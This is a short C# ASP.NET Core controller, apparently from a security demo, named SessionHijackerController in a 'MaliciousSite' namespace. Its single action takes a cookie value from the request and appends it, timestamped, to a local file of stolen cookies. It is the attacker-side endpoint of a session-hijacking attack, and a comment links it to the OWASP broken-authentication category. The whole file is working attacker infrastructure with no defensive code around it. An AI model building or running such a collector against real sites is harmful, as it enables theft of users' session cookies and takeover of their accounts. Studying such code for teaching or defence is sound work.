using System;
using Microsoft.AspNetCore.Mvc;

namespace MaliciousSite.Controllers
{
    public class SessionHijackerController : Controller
    {
        public IActionResult Index(string cookie)
        {
            //OWASP #2 broken authentication and session management
            if (!string.IsNullOrWhiteSpace(cookie))
            {
                System.IO.File.AppendAllText(@"C:\temp\maliciousdata\stolen_cookies.txt",
                    DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " | " + cookie + Environment.NewLine);
            }
            return Ok();
        }
    }
}